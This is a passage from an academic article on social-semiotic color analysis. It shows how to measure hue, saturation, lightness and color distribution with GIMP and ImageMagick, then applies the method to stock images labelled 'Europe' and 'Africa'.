+purest and most saturated colors on the color wheel are in the outer areas
+```
+farthest from the center (Rhyne, 2017, p. 61).
+```
+Value
+Refers to the brightness of a particular hue and varies with Saturation in
+the HSV color space. It ranges from 0%, pure black, to 100%, colors are
+```
+present (Rhyne, 2017, p. 62).
+```
+Lightness
+Refers to the degree of illumination of a given Hue in the HSL color
+space. It ranges from 0%, or no light, to 100%, or full illumination
+```
+(Rhyne, 2017, p. 62).
+```
+```
+Source: Created by the authors.
+```
+If we return to the example in Table 5, we find in the left column
+the HSV description of the Orange used in the image: for Hue, it is 38.5º
+```
+(Figure 5) of Red; for Saturation, it is 100, since it is a pure color; and
+```
+finally, for Value, it is 82%, which means that it is not a totally light color.
+As for Lightness, we can use the following mathematical formulas
+```
+to calculate the Lightness of a color (Saravana; Yamuna, 2016, p. 464):
+```
+```
+11 Cf. Rhyne (2017, p. 63-66) for a discussion regarding both models and their visual
+```
+representations.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2030
+The first three equations convert the RGB values from a scale
+of 0..255 to a scale of 0..1. We will again use the example from Figure
+2. Since we need the maximum and minimum values of RGB, we omit
+```
+Green and use only Red (209/255 = 0.81) and Blue (0/255 = 0). We can
+```
+now use these values in the last equation:
+This gives us ≈ 41%. So the Lightness of #D18600 is 41%. For
+```
+comparison, #FFFFFF (pure white) has a Lightness of 100% and #000000
+```
+```
+(pure black) has a Lightness of 0%.
+```
+Figure 5 – Diagram of hue or color wheel
+```
+Source: Adapted from Rhyne (2017, p. 61).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2031
+Furthermore, the FG/BG Color tool allows us to visualize and
+```
+edit these data (Table 7).
+```
+Table 7 — FG/BG Color
+The FG/BG Color menu contains several relevant data points. By default, on the right side,
+we can check the RGB and HSV values of the color, both on a scale from 0 to 100 and on a
+scale from 0 to 255. The “HTML Notation” refers to the HEX triplet of the color. Note that
+```
+it has no hashtag (#) at the beginning.
+```
+On the left, GIMP displays a visual representation of the image’s Saturation by default. The
+Hue scale is in the thinner colored column, while the Saturation and Value scale is shown
+in the rectangle right next to it. The value increases on the Y-axis, while the Saturation
+```
+increases on the X-axis. For example, in the upper left corner (in white) is 0 for Saturation
+```
+and 100 for Value, while in the lower right corner is 100 for Saturation and 0 for Value.
+The currently displayed color is the Orange from Figure 2, indicated by the crosshairs on
+the rectangle and the line on the thinner column.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2032
+GIMP presents four other visual representations: CYMK, Watercolors, Wheel, and Palette.
+In this article, we will focus on the wheel representation.
+The outer ring represents Hues that vary on a 360-degree scale. The inner triangle, in
+turn, represents Saturation and Value. Saturation scales vertically, while Value scales
+horizontally.
+This visual representation is particularly useful for determining color harmonies.
+```
+Source: Created by the authors.
+```
+One last parameter that the color picker tool of GIMP displays is
+the Alpha channels. For some images, it is possible to display a range from
+```
+transparency (0%) to total opacity (100%). For example, images in jpg
+```
+```
+(Joint Photographic Experts Group) format do not support transparency
+```
+and instead show a color, often white, in the background, while images
+```
+in png (Portable Network Graphic) format can (Table 8).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2033
+Table 8 – jpg vs. png
+Saved in the jpg. format, the image
+displays the missing part as white.
+```
+Saved in the png. format (and with the
+```
+```
+alpha channels enabled), the image
+```
+displays the missing part as transparency
+```
+(shown as a gray pattern).
+```
+```
+Source: Created by the authors.
+```
+Transparency is not limited to alpha channels, but it is important
+to note that we can analyze it via GIMP just as we can the other color
+features.
+For a more comprehensive color analysis, we can use the
+histogram from GIMP. A histogram is a graphical representation of
+```
+the distribution of data for a given variable. The Histogram (found in
+```
+```
+Windows → Dockable dialogues12) represents “the statistical distribution
+```
+```
+of color values” (GIMP Documentation Team, 2023, s.p.) and provides
+```
+```
+options for Value (brightness distribution), Red, Green, and Blue
+```
+```
+(intensity distribution per RGB channel), and alpha (opacity distribution).
+```
+In Table 9 we discuss the histogram based on a stock image.
+12 Whenever we show a tool’s path, we will highlight it in gray. The path will start from
+the menu bar on GIMP’s upper part. We will also highlight options present in GIMP.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2034
+Table 9 — Histogram in GIMP
+We will use an image from the Microsoft 365 library. The image shows a colorful
+arrangement of fruits and vegetables.
+We can see the full histogram in the figure above. For simplicity, we divided the window
+into three parts, described as follows.
+```
+In the upper area (red) we can change which channels the histogram displays (Value, Red,
+```
+```
+Green, Blue) and the display mode: linear, which is useful for photos, or logarithmic, which
+```
+```
+is useful for images that “contain substantial areas of constant color” (GIMP Documentation
+```
+```
+Team, 2023, s.p.). We can also change the histogram display from linear to perceptual
+```
+space. Here we will use the perceptual space and the linear display.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2035
+```
+In the middle (Green) we see the actual histogram. On the left, we show how it appears on
+```
+```
+GIMP, while on the right we show the same data as a graph. The horizontal axis (X) scales
+```
+```
+from 0 (black) to 255 (white). In this example, we used “value” as the variable. This means
+```
+```
+that we have a scale from the lowest to the highest Value (“brightness”). The vertical axis
+```
+```
+(Y) shows the number of pixels for a given value. For example, 4% of the pixels of the
+```
+image have a Value of 255, which means they have the maximum brightness.
+If we need to check how many pixels are in the range of a value, we can select a section of the
+histogram. In the example above, we select the range from 102 to 153 of Value. The range is
+highlighted in white and below it the exact selection is displayed numerically.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2036
+If we select the RGB option, GIMP shows the Red, Green, and Blue channels and how
+they overlap. White are the areas where all three overlap, while the Red, Green, and Blue
+areas show where these colors do not overlap. GIMP also shows the overlap of two colors:
+Red + Blue = Magenta
+Red + Green = Yellow
+Blue + Green = Cyan
+It is worth mentioning that these values are not the colors themselves, but their respective
+parameters of Red, Green, and Blue individually. This means that, for example, for a color
+```
+composed of (100, 0, 255), each parameter is plotted in the histogram.
+```
+In the case of the image, Red is particularly present at the upper end of the scale, while
+Blue is most present at the lower end of the scale. Green accents can also be seen in the
+```
+middle of the scale. Thus, we can see that Red and hues close to it (yellow, orange etc.)
+```
+are substantially more saturated than other hues. This is due to the fact that, overall, red
+```
+composition (closer to 255) is more prevalent than Green or Blue, a fact that may not be
+```
+easily discernible with mere perception.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2037
+Finally, in the lower area, we will find various statistics and other information. In Pixels,
+GIMP shows the number of pixels in the image, while Count shows how many pixels are in
+the selected area. Percentile refers to the percentage of pixels in the selected range.
+Median refers to the middle value in the selected range, while mean indicates the average
+value. Finally, Std dev refers to the standard deviation of the selected range or how
+```
+homogeneous the distribution of values in the selected range is (GIMP Documentation
+```
+```
+Team, 2023, s.p.), which can be used in research as an indicator of the color purity of the
+```
+composition.
+GIMP automatically converts its values to a number from 0 to 1, to the thousandth digit.
+These values represent the scale from 0 to 255 — the scale visually represented by the
+histogram. For example, 0.369 corresponds to 94.095 on a scale of 255, which means that
+```
+the RGB value of the image averages 94 (out of 255).
+```
+The standard deviation, simply put, indicates how much is the average dispersion from the
+mean. In our case, it is 0.296. If we were to plot the data on a graph, for example, we could
+```
+calculate one standard deviation below the mean (0.369 - 0.296 = 0.073) and one standard
+```
+```
+deviation above the mean (0.369 + 0.296 = 0.665), which would give us an interval of
+```
+0.073 ≤ x ≤ 0.665.
+Thus, the higher the standard deviation, the higher the hybridity of the colors, whether from
+```
+the total set (RGB) or for each channel individually.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2038
+```
+To visualize how each channel affects the image, we can use the Hue-Saturation tool (Colors
+```
+```
+→ Hue-Saturation...). The GIMP tool lets you edit the Hue, Lightness, and Saturation of
+```
+```
+the primary RGB colors and the complementary colors (Cyan, Magenta, and Yellow).
+```
+This allows us to locate areas of interest for each color. It should be noted, however, that
+depending on the colors used, we may also select colors that fall between a primary and
+a complementary color. In the image to the left, we desaturated all colors except for the
+Yellow hue, whose Saturation was set to maximum. This highlights the Yellow areas and
+some colors between Green and Yellow, and between Yellow and Red. If we do the same
+process but saturate Red and Green to the maximum, we can see how they relate to Yellow.
+```
+Source: Created by the authors.
+```
+The histogram can give us a quick overview of the image and
+its dominant channels. It can also be used in conjunction with the Select
+by color and the Fuzzy selection tools, both of which are included in
+the Toolbox. These tools allow us to select a specific color in the image:
+The first tool selects all instances of a particular color, while the second
+selects a delimited area where the color occurs. In the histogram, GIMP
+```
+shows how many pixels (both in count and percentile) are allotted to
+```
+the selected color. These tools also have a threshold option. By default,
+this is set to 0, which means the tool will only select the exact color we
+clicked on. If we increase the threshold, GIMP will average and select
+colors similar to the selected one, as shown in Table 10.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2039
+Table 10 – Select by color tool
+We have highlighted both tools in the figure above with a dark box. We can change them by
+right-clicking on their icons. The magic wand icon points to the Fuzzy selection tool, while
+the square icon points to the Select by Color tool.
+Both tools offer almost identical options. Relevant to this article is the threshold scale
+mentioned earlier and the drop-down menu directly below it. In it, the researcher can
+choose which parameter GIMP should use to select colors, such as Red, Green, and Blue
+values. By default, the “Composite” parameter is used, which takes into account the overall
+composition of the color.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2040
+When the Histogram tab is open, we can right-click on the image and go to Select →
+```
+All (Select all), which will select all pixels in the image. In our example, the image has
+```
+1,906,128 pixels.
+```
+We then use the Select by Color tool (with a threshold of 75) and click on a Yellow pixel in
+```
+```
+the image. The selected area is outlined with dashed lines. The histogram (in pixels) shows
+```
+how many pixels we have selected. In our case, it is 193,011 pixels, or about 10% of the
+entire image.
+```
+Source: Created by the authors.
+```
+Another important tool for color analysis is the Palette Import
+```
+and Editor (Windows → Palettes). GIMP allows the researcher to import
+```
+colors from any image and in this way create a palette based on the
+imported colors. In Table 11 we briefly describe the process.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2041
+Table 11 — Importing palettes in GIMP
+If we right-click on one of the palettes preloaded with GIMP, the Import Palette... option
+is displayed.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2042
+In the Import New Palette menu, we can import from an already created palette or from an
+```
+image (second option).
+```
+```
+In the import options we can choose how many colors the palette should contain (up to
+```
+```
+10,000), how many columns the palette should display, and finally we can group colors
+```
+with the Interval option. Although the limit is 10,000, it may not be possible to load all
+colors. Since a small change in the parameters will change the color, the image may
+contain several similar colors, which GIMP will add to the palette individually. Therefore,
+increasing the interval value will display an average color generated from a set of similar
+```
+colors (GIMP Documentation Team, 2023, s.p.).
+```
+```
+In the Colorcube Analysis (Colors → Info → Colorcube Analysis), GIMP shows how
+```
+many unique colors are present in the image. The software detects 388,632 unique colors
+in our image, which far exceeds the maximum capacity of the palette.
+Therefore, we can convert the image — most likely in RGB format — to index colors
+```
+(Image → Mode → Indexed...), which limits the colors to a maximum of 256.
+```
+Since GIMP tries to calculate an average value for the color of the image, it may change
+significantly. It is also important to note that due to the averaging of the image, the colors
+displayed may not exactly match the original colors, so it is not an accurate representation,
+but an overall view of the colors in the image.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2043
+In our example, we converted the image to 256-indexed colors and then back to RGB.
+We then created a 256-color palette. If we double-click on the created palette, the palette
+editor window will open. In it, we can change the number of columns displayed and, most
+importantly, check the data of each color. If we double-click on one of the colors, the Edit
+Palette window will open, which looks exactly like the FG/BG Color window. Note that
+changes made in the Edit Palette Color will affect the created palette.
+```
+Source: Created by the authors.
+```
+Depending on the quality and/or complexity of the image, the
+palette may be more or less indicative of the overall color composition of
+the image. Another option is the Colour wheel analysis plugin by Rebecca
+```
+(username rbreu), who also provides instructions for installing and using
+```
+the plugin. We used this tool to create Figure 6 based on our example:
+Figure 6 – Color wheel of the image
+RGB Index color Full-color wheel
+```
+Source: Created by the authors.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2044
+The plugin maps the colors on a color wheel, which allows us to
+determine the color harmonies present in the image. As we can see, the
+image uses colors from almost all hues except Blue and its adjacent hues.
+It is worth mentioning that this refers to the image as a whole, so all the
+elements depicted are taken into account. GIMP allows us to delete parts
+```
+of the image, which can be productive for color analysis (Figure 7). There
+```
+are several ways to achieve this, for example, using Fuzzy Selection and
+Select by Color tools or the Paths and Free Selection tools.
+Figure 7 — Purple areas vs non-Purple areas
+```
+Source: Created by the authors.
+```
+For a quantitative approach to color, GIMP offers the possibility
+to export a text file of the generated histogram. Under Color → Info
+→ Export Histogram... there are several options for displaying the
+```
+information in a comma separated values (CSV) file. Table 12 describes
+```
+the Export Histogram option and its output file.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2045
+Table 12 – Export histogram in GIMP
+In histogram file, the user can select the location of the file.
+“Bucket Size” “lets you control the number of values considered as similar and counted in
+the same ‘bucket’. A higher bucket size will produce fewer buckets, and thus fewer rows
+```
+in the exported file” (GIMP Documentation Team, 2023, s.p.).
+```
+```
+Sample Average produces either a histogram of all image layers (“yes”) or only the current
+```
+```
+layer (“no”).
+```
+```
+There are three options for the output format: Pixel count (pixels per bucket), normalized
+```
+```
+(pixels per bucket divided by the pixel count of the image), and percent, which does the
+```
+```
+same as normalized but displays the values as percentages (GIMP Documentation Team,
+```
+```
+2023, s.p.).
+```
+Range Start Value Red Green Blue
+0 9336 36513 84317 216677
+16 39960 46834 52292 94719
+32 37441 50903 43448 63539
+48 41285 48659 41558 67666
+64 36605 32875 53648 35025
+240 90709 90030 3251 2502
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2046
+We can access the output file with programs like Microsoft Notepad or Notepad++, which
+is open source and free, but also with spreadsheet programs like Microsoft Excel. In the
+example on the right, we created the file with a bucket size of 16 and a Percent output.
+“Range start” refers to the value from 0 to 255 for each of the parameters. For example, the
+penultimate row with a “Range Start” value of 48 refers to the 49th bucket and includes all
+pixels between the values 48 and 63. Therefore, the last four numbers in row 48 in order
+mean that “41,285 pixels have a value between 48 and 63,” “48,659 pixels have a Red value
+from 48 to 63,” “41,558 pixels have a Green value from 48 to 63,” and “67,666 pixels have
+```
+a Blue value from 48 to 63” (GIMP Documentation Team, 2023, s.p.). The last row ranges
+```
+from 240-255, the most saturated colors. As can be seen, Red is the representative channel
+in this range.
+```
+Source: Created by the authors.
+```
+Depending on the resolution of the image, trying to determine the
+colors individually may be overwhelming with this tool. Alternatively,
+ImageMagick can be used to determine exactly what colors are present
+in an image and how pronounced they are, allowing the user to determine
+which colors are dominant.
+Table 13 shows how to list the color composition of an image.
+Table 13 – Color composition using ImageMagick
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2047
+In Microsoft Windows, we can access the folder of the image. In the top bar Windows shows
+the path of the folder/file. On the left side, there is an icon for the folder. When we click on it,
+we can type “cmd” and press Enter. A window with a command prompt will open.
+It lists the path to the folder of the image. We can then type: magick image.ext -format
+%c histogram:info:- > list.txt 13. image.ext refers to the file name and extension of the
+```
+image (png., jpg., webM., etc.), while list.txt refers to a plain text file containing the color
+```
+information.
+The filename in our example is 01, and its extension is .png. So the string becomes magick
+01.png -format %c histogram:info:- > list.txt. After a few seconds, a file named “list.txt”
+appears in the image’s folder.
+```
+127: (0,0,0) #000000 black
+```
+```
+30: (0,0,2) #000002 srgb(0,0,2)
+```
+```
+14: (0,0,4) #000004 srgb(0,0,4)
+```
+```
+13: (0,0,5) #000005 srgb(0,0,5)
+```
+```
+5: (0,0,7) #000007 srgb(0,0,7)
+```
+```
+2: (0,0,8) #000008 srgb(0,0,8)
+```
+```
+4: (0,0,9) #000009 srgb(0,0,9)
+```
+```
+243: (0,1,0) #000100 srgb(0,1,0)
+```
+```
+11: (0,1,2) #000102 srgb(0,1,2)
+```
+```
+6: (0,1,3) #000103 srgb(0,1,3)
+```
+```
+6: (0,1,4) #000104 srgb(0,1,4)
+```
+```
+9: (0,1,5) #000105 srgb(0,1,5)
+```
+We can open the file with the standard Windows software Notepad or other text editors
+like Notepad++.
+In the file, each line corresponds to a color in the following format: first, how many pixels
+```
+correspond to the color; its RGB parameters; its HEX triplet value; and finally, its srgba value14.
+```
+As it is, ImageMagick has mapped 388,577 colors. Most of them contribute little to the
+overall image, corresponding to less than 100 pixels out of 1,906,128. This is because,
+```
+for example, a color characterized in RGB parameters as (224, 111, 232) is different from
+```
+```
+(224, 108, 232). Although they are hardly noticeable, ImageMagick considers them as
+```
+different and therefore counts them as separate entries.
+13 Code presented by user chas_prinz on Reddit https://www.reddit.com/r/GIMP/
+comments/rn8fyn/getting_colour_percentages_for_a_colour_indexed/
+14 sRGB, or standard RGB, is a color space created in 1996 by Microsoft and Hewlett-
+```
+Packard Company (RHYNE, 2017, p. 40).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2048
+So we can use index colors to Reduce the number of colors and group these similar colors.
+We will now use 256 colors. Although the document is clearer this way, it can still be
+cumbersome to read.
+To better analyze and organize the data, both on an RGB and index color basis, we can use
+Microsoft Excel. First, we can open the file in a text editor, use the Find and Replace function
+```
+(Ctrl+F), go to the Replace tab, and replace all “:” (colon) with nothing (leave “Replace
+```
+```
+with” blank15). When we copy and paste the text lines, Excel will automatically divide them
+```
+into different rows. We recommend leaving the first row blank. If the pasted data is in a
+single column, we can select all the rows and go to Data → Text to Columns. We first select
+Delimited, then click Next. Select “Space” from the Delimiters menu and then click Next and
+Finish. Excel will automatically split the data into columns. In the first row, we can now label
+```
+each column (e.g. “Number of Pixels”, “RGB”, “HEX”, etc.). Select the labels and go to Data
+```
+→ Filter. Excel now allows the researcher to filter the data, for example, by highest to lowest
+pixel count. This allows the researcher to determine, for example, which colors are dominant
+in the composition and better analyze the use of color in the image.
+15 We can also use the find and replace function on Microsoft Excel. However, Excel
+can incorrectly interpret the colon due to how to software reads data. It will then change
+the data shown.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2049
+In our example, we can see that in the index colors, the following are the five most common
+```
+colors in the image: (16,7,5), (14,20,4), (0,0,0), (34,22,8), (217,170,0). Excel can automatically
+```
+sum the selected values. If we select the number of pixel values for these five colors, Excel
+will show in the lower right corner that they total 50,432 pixels. If we then select the entire
+column, Excel displays 1,906,128, the same number shown by GIMP. Using these values, we
+can see that the five predominant colors account for about 2.6% of the entire image.
+We can then import this data into GIMP and create a palette for the dominant colors. Here
+we will select the 24 dominant colors from the image. First, we write a header in software
+like Notepad++ as follows:
+GIMP Palette
+#
+After the hashtag, we need to insert the RGB values of the colors. These values must not
+be between parentheses and must be separated by a comma and a space. To speed up the
+process, we can use Find and Replace to remove the parentheses and replace the commas
+```
+(,) with a comma + space (, ).
+```
+We can then import this file into GIMP using the Import palette... menu but instead of
+choosing an image as the source, we choose a palette file.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2050
+By default, GIMP arranges the colors from left to right according to their order in the txt.
+file. In this way, we get a visual representation of the colors by which occur most often.
+```
+Source: Created by the authors.
+```
+Color theory and software such as GIMP and ImageMagick can
+greatly enhance color analysis from a social-semiotic perspective. The
+categories presented here are consistent with Kress and van Leeuwen’s
+approach, both in their names and in their descriptions. Thus, rather than
+creating new categories from scratch, we will use Rhyne’s contributions
+to better adapt the features for digital color analysis in Table 14:
+Table 14 – Color distinctive features revised
+Distinctive
+feature Description
+Value
+```
+Refers to the scale from pure black (0% in HSV color space) to pure
+```
+```
+light (100% in HSV color space) (Rhyne, 2017, p. 62, Kress; Van
+```
+```
+Leeuwen, 2021, p. 245).
+```
+Saturation
+```
+Refers to the scale from pure colors (our hues) to neutral gray. On the
+```
+color wheel, the most saturated colors are in the outer region. It is one
+of the parameters in both HSV and HSL color spaces and scales from
+```
+0% (no dominance) to 100% (pure color) (Rhyne, 2017, p. 61, Kress;
+```
+```
+Van Leeuwen, 2021, p. 245).
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2051
+Distinctive
+feature Description
+Purity
+Refers to a scale between the use of a single color and its hues,
+```
+tints, tones, and shades (purity or monochromaticity) and a variety
+```
+```
+of analogous colors (hybridity) (Rhyne, 2017, p. 86, Kress; Van
+```
+```
+Leeuwen, 2021, p. 245).
+```
+Modulation
+Refers to the degree of monochromatic modulation, i.e., the use of a
+register within a color or its variety of hues, tints, tones, and shades
+```
+(Rhyne, 2017, p. 86, Kress; Van Leeuwen, 2021, p. 245).
+```
+Transparency
+Refers to the scale from transparency to opacity. For some image
+```
+extensions (e.g., png.), transparency can be quantified by alpha levels. For
+```
+```
+others, we detect it by color overlap (Kress; Van Leeuwen, 2021, p. 246).
+```
+```
+Luminosity (or
+```
+```
+Lightness)
+```
+Refers to the degree of brightness of a color. In HSL color space,
+```
+Lightness varies with Saturation from 0% (pure black) to 100% (presence
+```
+```
+of color) (Rhyne, 2017, p. 62, Kress; Van Leeuwen, 2021, p. 246-7).
+```
+```
+Differentiation Refers to the scale from monochrome registers to a full range of colorsand harmonies (Rhyne, 2017, p. 86, Kress; Van Leeuwen, 2021, p. 247).
+```
+Hue
+Hue in HSV and HSL color spaces varies in a 360-degree wheel,
+with 0/360 being Red. Hue can also be represented by its RGB
+configuration, i.e., how much Red, Green, and Blue are in the color.
+Finally, it can also be represented as a HEX triplet, which represents
+```
+the RGB values in a hexadecimal format (Rhyne, 2017, p. 61, 66).
+```
+```
+Source: Created by the authors.
+```
+5 Case study: color analysis of two stock images
+We will comparatively analyze two images to demonstrate the
+methods presented here and discuss the potential for meaning in colors.
+We will again draw on the Microsoft 365 image database. We searched for
+the keywords “Europe” and “Africa” and obtained the results in Figure 8:
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2052
+Figure 8 – Stock image for “Europe” and “Africa”
+```
+Source: Microsoft (2023).
+```
+Searching for “Europe” yields 11 images, while searching for
+“Africa” yields eight images. An important difference between the results
+```
+is the nature of the participants (Kress; Van Leeuwen, 2021, p. 45, p.
+```
+```
+113-5): Europe is represented by people, cityscapes, natural landscapes,
+```
+and animals, while Africa is represented mainly by animals and natural
+landscapes.
+Although the sample size is small, this difference could be relevant
+in terms of how Europe and Africa are culturally defined and semiotically
+realized. For example, one of the “Europe” images depicts the Eiffel
+Tower, which references the image to France, while one of the “Africa”
+images depicts the Pyramids of Giza in Egypt. Both are recognizable
+images for their respective countries, but in the context of the stock images
+presented, they have different meanings. If we place the Eiffel Tower in
+a series with other landscapes, we can consider it as one representative
+of European architecture among others. Conversely, the pyramids are the
+only man-made structure in Africa, which, in addition to emphasizing
+natural landscapes, can create an associative meaning of Europe as a
+metropolitan, modern place, and Africa as a natural, ancient place.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2053
+In addition, we can determine the location of the ‘Europe” results
+with relative precision, which means that we can more easily distinguish
+and recognize different parts of Europe. In the “Africa” results, on
+the other hand, the landscapes, apart from the pyramids, can only be
+identified as savannah. This represents Africa as a single landscape that
+is culturally recognized as a stereotypical image of “Africa,” which in
+turn reproduces an ideological notion of the African continent, devoid
+of its many cultures and biomes.
+This is significant in that while stock images are intended to be
+inherently neutral so that they are suitable for a variety of contexts and
+uses, there are nevertheless discourses that inform the semiotic choices
+employed, not necessarily from image to image, but based on the images
+chosen to represent a participant. Therefore, we will focus on two images
+```
+(Figure 9), one for each set, and analyze how the colors used in both
+```
+relate to discursive constructions of Europe and Africa.
+Figure 9 – Selected images from each search result
+```
+Source: Microsoft (2023).
+```
+```
+The European image shows the Amagertorv (Amager Square) in
+```
+Copenhagen, Denmark. The image depicts a person with a cup of coffee
+in the foreground and the cityscape in the background displaying several
+buildings, pedestrians, and the Stork Fountain in the center.
+In the African picture, there is an elephant in the foreground. In
+the background, there is an acacia tree and some undergrowth. Based
+on these descriptors, we can assign the image to the savannah biome,
+```
+one of the biomes where elephants live (Kingdon, 1997, p. 305), but we
+```
+cannot identify a specific country.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2054
+As for the use of colors, we can first analyze the images using
+the Colorcube analysis to determine the number of colors in each image,
+and the histogram to quantify the total values and RGB composition of
+```
+the images (Table 15).
+```
+Table 15 — Histogram analysis
+Europe Africa
+Number of unique colors: 1,040,592 Number of unique colors: 212,041
+```
+The Value (“brightness”) - that is, the distinction between black and full color - tends
+```
+toward the higher scale for both images. We used the scale selection to determine the range
+that accounts for 50% of the pixels of the images. According to the histograms, the elephant
+image has relatively more bright pixels than the city image. This means that although the
+elephant and the ground are darker than the background and make up a significant portion
+of the image, brightness prevails.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2055
+```
+The RGB composition presents peaks for all three colors, as well as some mixtures (such
+```
+```
+as Yellow and Magenta). To understand how each channel modulates the composition, we
+```
+can use the Hue-Saturation… tool.
+We have lowered the Saturation of all colors except Red and Yellow. To make the contrast
+between the two colors more visible, we inverted the hues so that Red became Magenta, and
+Yellow became Blue. As we can see, the image consists mainly of tones between Orange
+and Yellow. The presence of Green in the histogram represents Yellow, which is a mixture
+of Green and Red. Blue, on the other hand, is present because the light behind the elephant
+```
+is almost white, that is, in RGB (255, 255, 255).
+```
+Red Green
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2056
+Blue Cyan
+Yellow Magenta
+In contrast to the elephant image, the city shows several colors. By desaturating all but
+one of the hues, we can determine where each color appears most strongly. Green and
+```
+Magenta appear very sparsely; Blue, Cyan, and Yellow appear in specific areas, such as on
+```
+rooftops. Red covers the entire composition.
+```
+Source: Created by the authors.
+```
+Furthermore, we can list the colors present on the image with
+GIMP’s Index colors and ImageMagick. These tools yield the results
+displayed in Table 16.
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2057
+Table 16 — Color quantification
+```
+Source: Created by the authors.
+```
+Based on this data, we can propose how color creates meaning in
+these images. As mentioned earlier, semiotic resources are simultaneously
+historically situated and motivated by sign makers during the sign-making
+process. This means that while there are some culturally established uses
+```
+(e.g., Red as a sign of violence), we often need to consider the resource
+```
+on its own terms and how it is used in this specific semiotic artifact.
+In the case of the elephant image, there are two main hues: Orange
+```
+and Yellow, as well as some intermediate hues (e.g., Yellowish Orange).
+```
+Since they form a dividing line between the ground and the sky, we can
+```
+interpret that this diad harmony (Orange ⇔ Yellow) creates a contrast
+```
+between these two levels. On the other hand, since Orange and Yellow
+are close to each other, the meaning could be, conversely, that these two
+realms are similar and not opposite.
+Orange, in turn, also covers the cityscape. We can likewise
+consider Blue and Cyan in the roofs and the stork statue as harmonious.
+Cyan-Blue is complementary to Orange, while Blue is complementary
+to Yellow. Thus, they form a double complementary harmony. This has
+two immediate effects on the image: first, the Cyan on the statue against
+the background of the overall Orange composition makes the statue stand
+out more, even though it is very small. Second, it creates layers in the
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2058
+```
+image: The Blue and Cyan roofs separate the square and the buildings
+```
+from the sky. Since their hues complement each other, a striking but
+harmonious contour is created for these two areas.
+We can make some meaning hypotheses about the harmonies
+created, but as mentioned earlier, all the distinctive features work together
+to make a color effective. Therefore, we can analyze more features to
+make more meaning hypotheses. So far, we have been able to use Hues,
+```
+Purity (number of colors), and Differentiation (number of harmonies)
+```
+to establish possible opposing relationships that are likely or unlikely
+depending on how the other features work. So, we can analyze Saturation,
+Modulation, and Luminosity to better understand the images.
+As for Saturation, we can use the index color to group the colors
+into a manageable number. We can also use the Color Picker tool to find
+the average Saturation of an area of the image. In Table 17 we provide
+the processed images.
+Table 17 — Indexed colors
+By using indexed colors and the Color Picker
+tool, we can group parts of the image and
+check Saturation. Saturation leads to different
+```
+groupings: From the foreground to the
+```
+background, the image becomes progressively
+```
+less saturated; there is also an overlap in the
+```
+middle area between the elephant’s saturated
+head and the less saturated light in the
+background. Finally, the bottom and the legs of
+```
+the elephants are also saturated (except for the
+```
+```
+black areas), which could confirm the dichotomy
+```
+of the top and bottom areas of the image.
+In the case of the cityscape, there are
+several Saturation spots, of which the
+Orange-Yellow lights are the most
+important. The high Saturation of these
+areas creates points of interest in the
+overall composition, especially since
+they contrast with the grayish tones of
+some of the buildings and the square.
+```
+Source: Created by the authors.
+```
+Rev. Estud. Ling., Belo Horizonte, v. 31, n. 4, p. 2009-2065, 2023.2059
+```
+Interestingly, the sky in both images is almost white (255, 255,
+```
+```
+255), which means that they have almost 100% Lightness. In the case
+```
+of the elephant image, the sky looks like a light source, while in the
+case of the city image, it does not. Instead, the artificial lights look like
+standout lights.
+This is due not only to the colors used but also to the composition.
+For example, the first image frames the skylight in the center, a salient
+```
+area (Kress; Van Leeuwen 2021, p. 198), while the second image confines
+```
+the sky to the upper area. In addition, the purity of the white color looks
+less interesting than the many colors in the lower areas, especially in the
+center, where the coffee cup, the building in the middle, and the statue
+directly below are located.
+By combining Saturation, Lightness, and image composition,
+we can create and add to our hypothesis. First, Saturation adds three-
+dimensionality to the image of the elephant by adding a dichotomy of
+foreground and background in addition to the dichotomy of top and
+bottom. In the image of the city, on the other hand, Saturation highlights
+the artificial lights in different areas of the square. However, one of the
+effective areas of light in the city image, the sky, is not very noticeable.
+We can now analyze the features of these two images
+```
+comparatively: The modulation of multiple hues can create a “complex”
+```
+image, as opposed to a “simple” image. In these cases, the contrast can
+```
+come from the nature of what is being depicted (a city versus an animal),
+```
